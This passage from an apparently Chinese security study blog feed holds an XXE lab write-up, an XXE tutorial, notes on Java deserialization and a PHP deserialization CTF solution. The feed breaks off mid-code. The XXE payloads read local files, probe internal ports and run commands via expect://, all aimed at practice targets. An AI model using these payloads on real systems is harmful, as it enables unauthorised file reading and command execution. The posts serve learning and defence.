title="0x10"></a>0x10</h2><p>这里接着进行XXE注入，将根目录下的<code>flagmeout.php</code>文件源码读取出来：</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flagmeout.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密得到flag，发现flag内容被加密了：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234626424.png" alt="image-20220605234626424"></p><p>这是base32加密，使用在线工具进行解密，解密得到base64：<br><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234805730.png" alt="image-20220605234805730"></p><p>接着解密得到flag.php文件的访问路径：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234851356.png" alt="image-20220605234851356"></p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>继续XXE注入查看flag.php源码：</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;.flag.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密后得到乱码：<br><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605235123485.png" alt="image-20220605235123485"></p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>最后使用phpstudy创建1.php文件访问得到flag：</p><pre class="line-numbers language-none"><code class="language-none">flag：SAFCSP&#123;xxe_is_so_easy&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220606002026364.png" alt="image-20220606002026364"></p><h2 id="0x13-总结"><a href="#0x13-总结" class="headerlink" title="0x13 总结"></a>0x13 总结</h2><p>这个靶机总体来说不是很难，玩过之后对XXE会有更深的了解，最主要还是细心观察。</p>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE和XML-利用检测绕过</title>
      <link href="/2022/06/05/XXE%E5%92%8CXML-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>/2022/06/05/XXE%E5%92%8CXML-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/05/XXE%E5%92%8CXML-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/XML&XXE.png" alt="XML&amp;XXE"></p><h2 id="0x01-XML简介"><a href="#0x01-XML简介" class="headerlink" title="0x01 XML简介"></a>0x01 XML简介</h2><p>###0x00</p><p>1、XML指可扩展标记语言，它被设计用来传输和存储数据。（HTML被用来显示数据）<br>2、XML没有预定义的标签，需要自行定义标签<br>3、XML是不作为的，及它不存在任何的行为，只是用来结构化、传输和存储信息<br>4、它仅仅是纯文字<br>5、XML 是独立于软件和硬件的信息传输工具。<br>（更多介绍详见w3school的介绍）</p><p>w3school介绍：</p><p><a href="https://www.w3school.com.cn/xml/xml_intro.asp">https://www.w3school.com.cn/xml/xml_intro.asp</a></p><h3 id="0x01-XML结构"><a href="#0x01-XML结构" class="headerlink" title="0x01 XML结构"></a>0x01 XML结构</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--声明部分--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?xml</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--文档类型定义部分--></span>&lt;! DOCTYPE note[&lt;!ELEMENT file SYSTEM "file:///var/passwd">]><span class="token comment">&lt;!--内容部分--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>letter</span> <span class="token attr-name">date</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2021/10/20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>gs<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>记得去外滩！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>letter</span><span class="token punctuation">></span></span>第2行 是XML声明，它定义了XML的版本（version）和字符编码（encoding）第4到6行是文档类型定义（DTD）内容第5行引入了外部实体第8-13行是内容部分第8行的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>letter</span><span class="token punctuation">></span></span>是根节点，date是它的属性第9行到第12行是具体的内容（<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>），称为子元素第12行显示了引入的外部实体第13行则是根节点的闭标签<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-XML语法说明"><a href="#0x02-XML语法说明" class="headerlink" title="0x02 XML语法说明"></a>0x02 XML语法说明</h3><p>1、每个标签都对应有一个闭合的标签。</p><p>2、XML文档<strong>必须包含根节点</strong>。文档中的所有元素形成了一颗文档树，这颗树从根部开始并扩展到最底端。</p><p>3、上下层级的元素存在父子的关系，同级的为同胞（兄弟姐妹）</p><p>4、所有的元素都可以拥有子元素、文本内容和属性</p><p>5、XML标签大小写敏感</p><p>6、XML标签必须正确的嵌套</p><p>7、XML中的属性需要加引号</p><p>8、XML中的一些特殊字符无法直接在标签内部当作文本使用。比如<code>&lt;message&gt;123 &lt; 321&lt;/message&gt;</code>，此时的<code>&lt;</code>不再是小于号，而会被解析器当作新元素的开始。因此此处需要使用<strong>实体引用</strong>：<code>&amp;lt;</code>。实体引用对照表如下：</p><table><thead><tr><th align="center">实体引用</th><th align="center">符号</th></tr></thead><tbody><tr><td align="center"><code>&amp;lt;</code></td><td align="center">&lt;</td></tr><tr><td align="center"><code>&amp;gt;</code></td><td align="center">&gt;</td></tr><tr><td align="center"><code>&amp;amp;</code></td><td align="center">&amp;</td></tr><tr><td align="center"><code>&amp;apos;</code></td><td align="center">’</td></tr><tr><td align="center"><code>&amp;quot;</code></td><td align="center">“</td></tr></tbody></table><p>参考文章：<br><a href="https://blog.csdn.net/weixin_43876438/article/details/120906582">https://blog.csdn.net/weixin_43876438/article/details/120906582</a></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>XML文档类型定义包括：</strong><br>内部声明DTD格式：<code>＜!DOCTYPE 根元素［元素声明］＞</code>。<br>引用外部DTD格式：<code>＜!DOCTYPE 根元素 SYSTEM ”文件名 ”＞</code>。<br>在DTD中进行实体声明时，将使用<code>ENTITY</code>关键字来声明 。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明 。<br>内部声明 实体格式：<code>＜!ENTITY 实体名称 ”实体的值”＞</code>。<br>引用外部 实体格式：<code>＜!ENTITY 实体名称 SYSTEM &quot;URI&quot;＞</code>。</p><pre class="line-numbers language-none"><code class="language-none">文档类型定义（DTD）&lt;!DOCTYPE Pwn [&lt;!ENTITY subscribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p> <strong>DTD（Document Type Definition） 文档类型定义</strong></p><p>定义XML文档的合法构建模块:</p><p><strong>DTD声明</strong><br>内部声明DTD：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>引用外部DTD：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code><br><strong>DTD实体</strong><br>定义引用普通文本或特殊字符的快捷方式的变量；<br>通用实体：<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code><br>外部通用实体：<code>&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;或&lt;!ENTITY 实体名 PUBLIC &quot;public_ID&quot; &quot;URI/URL&quot;&gt;</code><br>通用实体引用：&amp;实体名;<br>参数实体：<code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code>（%后有个空格）<br>外部参数实体：<code>&lt;!ENTITY % 实体名 SYSTEM &quot;URI/URL&quot;&gt;</code><br>参数实体引用：%实体名;<br><strong>参数实体只能在DTD中被引用</strong></p><h3 id="0x05-文档元素（XML元素）"><a href="#0x05-文档元素（XML元素）" class="headerlink" title="0x05  文档元素（XML元素）"></a>0x05  文档元素（XML元素）</h3><p>定义：<code>&lt;!ELEMENT 元素名 元素类型&gt;</code><br> 命名规则：</p><ol><li>名称可以包含字母、数字以及其他的字符；</li><li>名称不能以数字或者标点符号开始；</li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始；</li><li>名称不能包含空格；</li></ol><h2 id="0x02-XML和XXE及区别"><a href="#0x02-XML和XXE及区别" class="headerlink" title="0x02 XML和XXE及区别"></a>0x02 XML和XXE及区别</h2><p><strong>XML和XXE</strong>：</p><p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p><strong>区别</strong>：</p><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><h2 id="0x03-各种脚本类型可使用的协议"><a href="#0x03-各种脚本类型可使用的协议" class="headerlink" title="0x03 各种脚本类型可使用的协议"></a>0x03 各种脚本类型可使用的协议</h2><table><thead><tr><th align="center">libxml2</th><th align="center">PHP</th><th align="center">Java</th><th align="center">.NET</th></tr></thead><tbody><tr><td align="center">file，http，ftp</td><td align="center">file，http，ftp，php，compress.zlib，compress.bzip2，data，glob，phar</td><td align="center">http，https，ftp，file，jar，netdoc，mailto，gopher *</td><td align="center">file，http，https，ftp</td></tr></tbody></table><h2 id="0x04-XXE漏洞"><a href="#0x04-XXE漏洞" class="headerlink" title="0x04 XXE漏洞"></a>0x04 XXE漏洞</h2><h3 id="0x00-危害"><a href="#0x00-危害" class="headerlink" title="0x00 危害"></a>0x00 危害</h3><ul><li><strong>任意文件读取</strong>。可以配合任意文件上传漏洞实现getshell</li><li>通过某些协议（比如安装expect扩展的PHP环境中）可以实现<strong>远程命令执行</strong></li><li>通过HTTP协议<strong>探测内网端口</strong></li></ul><h3 id="0x01-防护"><a href="#0x01-防护" class="headerlink" title="0x01 防护"></a>0x01 防护</h3><ul><li>使用开发语言提供的禁用外部实体来防止注入</li><li>过滤用户提交的XML数据。比如过滤掉<code>&lt;!DOCTYPE</code>或<code>&lt;!ENTITY</code></li></ul><h3 id="0x02-攻击方式"><a href="#0x02-攻击方式" class="headerlink" title="0x02 攻击方式"></a>0x02 攻击方式</h3><p>方式一，构建如下payload：<code>]&gt;</code></p><p>通过file协议可以实现任意文件读取</p><p>方式二，构建payload：<code>&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;http://127.0.0.1:81&quot;&gt;]&gt;</code></p><p>通过HTTP协议可以实现端口探测</p><p>方式三，构建payload：<code>&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;expect://whoami&quot;&gt;]&gt;</code></p><p>通过expect协议可以执行系统命令</p><h3 id="0x03-漏洞发现"><a href="#0x03-漏洞发现" class="headerlink" title="0x03 漏洞发现"></a>0x03 漏洞发现</h3><p><strong>利用XXE-labs的学习可以检测发现XXE漏洞。</strong></p><p>在数据包爬行目录时候去发现数据包里面有符合XML数据传输的地方，在传输数据地方插入payload即可。</p><p>##0x05 自动化XXE注入工具</p><p>下载链接：<br><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p><p>参考文章：<br><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-JAVA</title>
      <link href="/2022/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JAVA/"/>
      <url>/2022/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JAVA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JAVA/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="Java反序列化"></p><h2 id="0x01-Java中的API实现"><a href="#0x01-Java中的API实现" class="headerlink" title="0x01 Java中的API实现"></a>0x01 Java中的API实现</h2><p>位置：Java.io.ObjectOutputStream             Java.io.ObjectInputStream</p><p><strong>序列化</strong>：ObjectOutputStream 类–&gt;writeObject()</p><p>​<strong>注：</strong>该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中按Java的标准约定是给文件一个.ser扩展名</p><p><strong>反序列化</strong>：ObjectInputStream–&gt;readObject()</p><p>​                  <strong>注：</strong>该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p><h2 id="0x02-序列化和反序列化"><a href="#0x02-序列化和反序列化" class="headerlink" title="0x02 序列化和反序列化"></a>0x02 序列化和反序列化</h2><p>**序列化 (Serialization)**：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。</p><p><strong>反序列化</strong>：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化</p><h2 id="0x03-Java序列化标志参考"><a href="#0x03-Java序列化标志参考" class="headerlink" title="0x03 Java序列化标志参考"></a>0x03 Java序列化标志参考</h2><p>一段数据以“rO0AB”开头，那么它很可能是Java序列化base64加密的数据</p><p>一段数据以“aced”开头，那么它很可能是Java序列化的16进制</p><h2 id="0x04-涉及靶场及工具"><a href="#0x04-涉及靶场及工具" class="headerlink" title="0x04 涉及靶场及工具"></a>0x04 涉及靶场及工具</h2><p>1、Webgoat（Java靶场）：</p><p><a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p><p>2、网鼎杯朱雀组-Web-think_java反序列化靶场</p><p>3、Java反序列化工具：</p><p><a href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a></p><p><a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>没学过Java，看不懂，以后学完Java再补回来Java安全的内容吧。</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化靶场</title>
      <link href="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-bugku-CTF-点login咋没反应"><a href="#0x00-bugku-CTF-点login咋没反应" class="headerlink" title="0x00 bugku-CTF-点login咋没反应"></a>0x00 bugku-CTF-点login咋没反应</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>一道PHP反序列化的CTF题目。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>打开靶场看到有登录框，并且给提示说点了login没有反应</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604180110136.png" alt="image-20220604180110136"></p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604180121475.png" alt="image-20220604180121475"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>查看源代码发现有一个<code>admin.css</code>文件，打开查看</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604180456768.png" alt="image-20220604180456768"></p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604180551683.png" alt="image-20220604180551683"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>可以看到提示<code>try ?28606</code>，试试传入28606看返回结果</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604180846451.png" alt="image-20220604180846451"></p><p>可以看到返回了源代码。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>进行一下代码审计：</p><p>代码中有一个变量KEY，值为ctf.bugku.com；并且包含一个flag.php文件，如果设置了以GET方式接收28606这个参数，就显示源代码，否则就将cookie值反序列化之后若是等于KEY值，就输出flag。</p><p><strong>注意：这里的&#x3D;&#x3D;&#x3D;是PHP强类型比较。</strong></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>利用PHP在线平台将KEY值序列化输出</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604182212423.png" alt="image-20220604182212423"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>抓包，将序列化输出的值放入cookie处，放包，得到flag。</p><pre class="line-numbers language-none"><code class="language-none">Cookie: BUGKU&#x3D;s:13:&quot;ctf.bugku.com&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604183716519.png" alt="image-20220604183716519"></p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604183617035.png" alt="image-20220604183617035"></p><h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>开始拿到题的时候首先要查看源代码找到<code>admin.css</code>文件找到能够显示源码的参数，之后进行代码审计了解到是PHP反序列化的题目，并且，<code>Cookie</code>提交的参数值为<code>BUGKU</code>，如上图所示，若<code>Cookie</code>提交格式不正确不会出<code>flag</code>，抓包时候若没有<code>Cookie</code>自己加上<code>Cookie</code>字段即可。</p><h2 id="0x01-网鼎杯-2020-青龙组AreUSerialz"><a href="#0x01-网鼎杯-2020-青龙组AreUSerialz" class="headerlink" title="0x01 网鼎杯 2020 青龙组AreUSerialz"></a>0x01 网鼎杯 2020 青龙组AreUSerialz</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>打开靶场，给到PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string 